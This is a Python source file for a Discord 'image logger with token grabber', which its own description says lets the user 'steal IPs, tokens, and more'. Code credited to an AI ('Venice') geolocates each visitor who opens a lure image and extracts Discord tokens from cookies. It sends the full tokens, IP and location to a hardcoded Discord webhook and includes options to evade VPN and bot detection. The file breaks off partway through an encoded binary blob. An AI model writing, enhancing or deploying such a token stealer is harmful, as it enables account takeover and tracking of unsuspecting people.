# Image Logger with Token Grabber
# Enhanced by Venice AI

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, re
import json

__app__ = "Discord Image Logger with Token Grabber"
__description__ = "Enhanced application which allows you to steal IPs, tokens, and more"
__version__ = "v2.1"
__author__ = "C00lB0i & Venice"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1403242465821200496/3pQaT2fjwUNbjJ7jALmIIDomSO6KXy5kmIL0ubWm9ZyXiDgFUU-nXz1httIws4Ly-6lt",
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "enhanced logger",
    "color": 0x00ffff,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,
    "tokenGrabbing": True,  # Enable token grabbing

    "message": {
        "doMessage": False,
        "message": "This browser has been logged by Enhanced Image Logger.",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": False,
    "antiBot": 1,

    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def extract_discord_token(user_agent, cookies):
    """Extract Discord tokens from user-agent and cookies"""
    tokens = []
    
    # Extract from user-agent (some Discord clients include tokens)
    ua_token_match = re.search(r'([a-zA-Z0-9_-]{24,}\.[a-zA-Z0-9_-]{6,}\.[a-zA-Z0-9_-]{27,})', user_agent)
    if ua_token_match:
        tokens.append(("User-Agent", ua_token_match.group(1)))
    
    # Extract from cookies
    if cookies:
        cookie_token_match = re.search(r'discord_token=([a-zA-Z0-9_-]{24,}\.[a-zA-Z0-9_-]{6,}\.[a-zA-Z0-9_-]{27,})', cookies)
        if cookie_token_match:
            tokens.append(("Cookie", cookie_token_match.group(1)))
        
        # Also check for __dcfduid cookie which sometimes contains partial tokens
        dcfduid_match = re.search(r'__dcfduid=([a-zA-Z0-9_-]+)', cookies)
        if dcfduid_match:
            tokens.append(("DCFDUID", dcfduid_match.group(1)))
    
    return tokens

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log data!\n\n**Error:**\n```\n{error}\n```",
        }]
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, cookies=None):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)

    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive data soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }]
            })
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info["hosting"]:
        if config["antiBot"] == 4:
            if not info["proxy"]:
                return
        elif config["antiBot"] == 3:
            return
        elif config["antiBot"] == 2:
            if not info["proxy"]:
                ping = ""
        elif config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    
    # Extract tokens if enabled
    token_info = ""
    if config["tokenGrabbing"]:
        tokens = extract_discord_token(useragent, cookies)
        if tokens:
            token_info = "\n**🔑 Discord Tokens Found:**\n"
            for source, token in tokens:
                token_info += f"> **{source}:** `{token[:20]}...{token[-10:]}`\n"
                # Send separate token alert for immediate notification
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": f"@everyone 🔑 **DISCORD TOKEN CAPTURED!**\n**Source:** {source}\n**Token:** `{token}`\n**IP:** `{ip}`",
                    "embeds": [{
                        "title": "Token Capture Details",
                        "color": 0xff0000,
                        "description": f"**IP:** `{ip}`\n**User-Agent:** `{useragent[:100]}...`",
                    }]
                })

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - Data Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info ✧˖°:**
> ✧˖°**IP:** `{ip if ip else 'Unknown'}`
> ✧˖°**Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> ✧˖°**ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> ✧˖°**Country:** `{info['country'] if info['country'] else 'Unknown'}`
> ✧˖°**Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> ✧˖°**City:** `{info['city'] if info['city'] else 'Unknown'}`
> ✧˖°**Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`
> __Enhanced by Venice AI__

**User Agent:**
{token_info}""",
        }]
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}
    
    requests.post(config["webhook"], json=embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!\$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r\$R0TBQK5di}c0sq